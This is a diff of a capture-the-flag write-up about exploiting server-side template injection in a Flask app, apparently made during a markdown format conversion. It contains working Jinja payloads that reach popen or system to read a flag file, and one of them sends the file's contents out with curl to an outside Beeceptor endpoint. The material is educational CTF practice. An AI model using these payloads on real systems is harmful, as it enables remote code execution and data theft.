@@ -15,8 +15,7 @@ Challenge: http://h4ck3r.quest:8700/
 [Web Security 0x1](https://youtu.be/_hasOTGximc?t=5863)
 
 ## Source code
-:::spoiler code
-```python=
+```python
 from flask import Flask, render_template_string, request, send_file
 
 app = Flask(__name__)
@@ -47,10 +46,8 @@ def source():
 if __name__ == '__main__':
     app.run(threaded=True, debug=True)
 ```
-:::
 
 ## Exploit
-
 ### Easy way
 {% raw %}
 payload: `{{[].__class__.__base__.__subclasses__()[132].__init__.__globals__['popen']("cat /th1s_15_fl4ggggggg").read()}}`
@@ -59,10 +56,10 @@ payload: `{{[].__class__.__base__.__subclasses__()[132].__init__.__globals__['po
 
 ### Need Tool way - [Beeceptor](https://beeceptor.com/)
 `Beeceptor` will catch our result from `curl`. 
-<font color="FF0000">It'll execute `cat /th1s_15_fl4ggggggg` first and the result will be sent to `Beeceptor` as attached data by `curl`.</font>
+<span style="background-color: yellow">It'll execute `cat /th1s_15_fl4ggggggg` first and the result will be sent to `Beeceptor` as attached data by `curl`.</span>
 Payload: 
 {% raw %}
-```!
+```
 {{[].__class__.__base__.__subclasses__()[132].__init__.__globals__['system']('curl {Beeceptor URL} -d "`cat /th1s_15_fl4ggggggg`"')}}
 ```
 {% endraw %}
